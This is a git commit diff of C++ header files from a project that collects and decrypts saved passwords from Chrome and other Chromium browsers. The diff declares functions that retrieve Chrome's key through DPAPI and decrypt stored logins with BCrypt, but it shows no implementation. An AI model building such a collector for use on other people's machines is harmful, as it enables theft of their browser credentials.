2dadda2de2c16157acf181dae53cbb4a0344c406
YankeesGo <64542974+SaulBerrenson@users.noreply.github.com>
2021-07-15 16:08:38 +0300

    refactoring to chrome decryptor

---
+++ includes/ChromeDecryptor.h
@@ -0,0 +1,45 @@
+﻿#pragma once
+#include <json.hpp>
+
+#include "Forwards.h"
+#include "IDecryptor.h"
+#include <FileOperations.h>
+
+#define DPAPI_PREFIX_LEN 5
+#define MAX_SIZE_PASS 1*1024
+
+class ChromeDecryptor : public IDecryptor 
+{
+public:
+	ChromeDecryptor();
+    ~ChromeDecryptor() override;	
+	bool init(const String& sPath) override;
+    bool decrypt_data(const String& encrypted_data, String& decrypted_data) override;
+
+    void set_password_size(int size);
+private:
+
+    bool get_chrome_key(std::string& key, unsigned long& keySize, const String& chromium_path);
+    bool get_key_path(String& keyPath, const String& chromium_path);
+    bool key_decrypt(std::string keyBase64, DWORD keySize, char* decKey);
+    bool dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText);
+
+    bool init_for_chrome_80();
+
+    bool init_key_for_chrome_80(PBYTE pbKey, ULONG sizeKey);
+
+    BCRYPT_ALG_HANDLE m_hAlg;
+    BCRYPT_KEY_HANDLE m_hKey;
+    int m_password_size = 0;
+    char* m_pbOutput = nullptr;
+
+   
+    std::function<f_BCryptDecrypt>                  m_BCryptDecrypt;
+    std::function<f_CryptUnprotectData>             m_CryptUnprotectData;
+    std::function<f_BCryptOpenAlgorithmProvider>    m_BCryptOpenAlgorithmProvider;
+    std::function<f_BCryptSetProperty>              m_BCryptSetProperty;
+	std::function<f_BCryptGenerateSymmetricKey>     m_BCryptGenerateSymmetricKey;
+	
+};
+
+
--- includes/ChromeParser.h
+++ includes/ChromeParser.h
@@ -17,49 +17,34 @@
 
 #endif
 
-#define DPAPI_PREFIX_LEN 5
+
 #define V10_LEN 3
 #define NONCE_LEN 12
-#define MAX_SIZE_PASS 1*1024
 
 
 
-
-
-
-class EXPORT_F chromium_parser : public ICollector
+class EXPORT_F ChromiumParser : public ICollector
 {
 public:
-	explicit chromium_parser()
-		: m_hAlg(nullptr), m_hKey(nullptr)
+	explicit ChromiumParser()
+		
 	{
 	}
 
-	~chromium_parser() = default;
+	~ChromiumParser() override;
 
 	List<AccountData> collect_data() override;
 	
 private:
 
-	void try_collect(const String& chromium_path);
-	
-	bool get_path_to_db(const String& chromium_path);
-	bool get_decryption_key(const String& chromium_path);
-	bool get_chrome_key(std::string& key, unsigned long& keySize, const String& chromium_path);
-	bool get_key_path(String& keyPath, const String& chromium_path);
-	bool key_decrypt(std::string keyBase64, unsigned long keySize, char* decKey);
-	static bool dpapi_decrypt(unsigned char* encText, unsigned long encTextSize, char* decText);
-	bool init_for_chrome_80(void);
-	bool init_key_for_chrome_80(IN PBYTE pbKey, IN ULONG sizeKey);
-	
+	void try_collect(const String& chromium_path);	
+	bool get_path_to_db(const String& chromium_path);	
 	
 	char* m_pbOutput = nullptr;
-	BCRYPT_ALG_HANDLE m_hAlg;
-	BCRYPT_KEY_HANDLE m_hKey;
+	
 	String m_chrome_sqlite_path;
-
 	List<AccountData> m_collected_data;
-
+	
 	const List<String> m_chromium_list {
 		
 		"\\Google\\Chrome",
